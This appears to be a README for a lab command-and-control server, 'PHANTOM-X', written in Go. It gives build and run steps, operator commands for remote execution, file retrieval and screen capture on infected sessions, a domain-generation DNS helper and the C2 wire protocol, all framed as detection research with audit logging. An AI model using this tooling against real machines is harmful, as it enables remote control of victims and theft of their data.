# PHANTOM-X -- Phase 5 :: C2 Server (Go implementation)

`c2_server.go` is a Go implementation of the lab C2 server. It speaks the
same wire protocol as the Python reference (`c2_server.py`), so the same C
payload works against it unchanged.

---

## Why a second implementation

The lab's ground rule #6 is *"cross-validate before trusting: every
analyzer is checked against an independent implementation."*

A protocol is a claim about bytes. Two implementations of the same protocol
is what turns that claim into a checked one. The Go server was written from
the protocol description in `px_payload.c`'s source comment; the Python
server was written first and independently. When they agree, the
description is right.

**This found two real bugs:**

- The payload's own formatter did not understand `%ld`, so the exit code in
  every `RESULT` line arrived as the literal text `%ld`. Both servers
  dutifully reported `exit_code=%ld`. Nothing complained, because the value
  was a non-empty string — and a failure was indistinguishable from a
  success.
- The Go server's `Accept()` blocked forever, so `--duration` never fired
  and the server could not shut itself down. The Python server had no such
  problem, which is exactly why the comparison was worth writing.

---

## Build

```powershell
cd phase5_network
go build -trimpath -ldflags "-s -w" -o px_c2.exe .
```

For the Linux rig:

```bash
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o px_c2 .
```

No dependencies. `go.mod` declares no requirements, so this builds offline.

---

## Run

```powershell
.\px_c2.exe --host 127.0.0.1 --port 9001 --log c2_audit.jsonl
```

| Flag | Meaning |
|---|---|
| `--host` | bind address. **Use the lab-segment address, not `0.0.0.0`** |
| `--port` | bind port (default 9001) |
| `--log` | JSONL audit log path |
| `--no-console` | headless, for scripted runs |
| `--duration` | stop cleanly after N seconds (0 = run forever) |
| `--key` | the shared channel key for the encrypted arm (default: the built-in lab key) |
| `--quarantine` | directory to write received file transfers into |

### Console commands

```
  list                 show active sessions
  exec <id|all> <cmd>  run a command in one or all sessions
  ping <id|all>        measure round trip latency
  cap <id> <tech> [a]  run one technique from the capability library
  dl <id> <path>       ask a session to transfer a file
  shot <id>            ask a session to capture the screen
  kill <id|all>        send EXIT (controlled session termination)
  stats                counters and audit log path
  help                 this text
  quit                 stop the server
```

### Running it on Linux (the Kali rig)

Nothing about the server is Windows-specific. Two ways:

```bash
# 1. the Go binary, cross-compiled (one static file, no runtime)
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o px_c2 .
./px_c2 --host 0.0.0.0 --port 9001 --log c2_audit.jsonl

# 2. the Python reference, which needs nothing but a Python 3
python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

Three things change when the server is on the other machine:

**The payload must be built with the SERVER's address.** The address is
compiled into the payload, and it is not the same address as the one on
the Windows box:

```powershell
# on the build machine
.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

**The domain generation arm needs a resolver.** The generated hostname has
to resolve to the server, and the payload resolves it with the *Windows*
system resolver. So either the Kali box runs the lab DNS helper on port 53
and the VM's resolver points at it:

```bash
python3 dga_dns.py --host 0.0.0.0 --port 53 --c2 192.168.77.1
```

or the Windows hosts file gets an entry for today's generated name. Every
other arm connects to the address directly and needs neither.

**The encrypted channel needs both sides to agree on the key.** The
built-in default is the same on both, so it works with no configuration.
If the operator sets `--key` on the server, the payload needs the same key
in `PX_C2_KEY` or compiled in.

The commands still run on the **Windows** machine. Where the server lives
changes nothing about where the commands land.

---

## Protocol

```
client -> server   HELLO|<arch>|<pid>|<hostname>
                   CAPS|<mask>
                   PONG
                   RESULT|<cmd_id>|<base64 output>|<exit_code>
                   CHUNK|<cmd_id>|<seq>|<total>|<base64 bytes>
                   DONE|<cmd_id>|<total bytes>
server -> client   PING
                   EXEC|<cmd_id>|<command line>
                   CAP|<cmd_id>|<technique>|<arguments>
                   DL|<cmd_id>|<path>
                   SHOT|<cmd_id>
                   EXIT
```

Plain TCP by default; the encrypted arm wraps each line in a length-
prefixed frame. The point of this rig is to produce traffic that can be
analysed, and a payload that can be observed by Defender and Sysmon. A
stealthy channel would produce nothing worth measuring.

Every session, command, result and disconnect is written to the audit log.
Nothing is done quietly — including a PONG that arrives with no matching
PING outstanding, which is recorded as `unmatched`.

---

## Validation

```bash
# against the REAL Windows payload -- not a mock
cd phase5_network
go test -v -run TestGoC2Integration -payload ../dist/phantom-x-vm-lab/px_payload.exe .

# against the Python reference implementation
python3 validate_c2_equivalence.py --go ../dist/native/px_c2.exe
```

The Go test drives the actual `px_payload.exe` binary and asserts on a
full session: HELLO parsed, latency measured, EXEC round trip with the
correct output, counters incremented, clean EXIT handshake, and a complete
JSONL audit log.

A mock client would only prove that the mock and the server agree with
each other. The point of using the real payload is that it cannot agree
with a mock — it speaks whatever the payload actually speaks, including
the bugs.

---

## Relationship to the Python server

The Python implementation stays. It is the reference, it is what the
existing test harnesses import, and it is readable by anyone who wants to
check the protocol by reading one file.

Use whichever you prefer. `validate_c2_equivalence.py` proves they are
interchangeable.
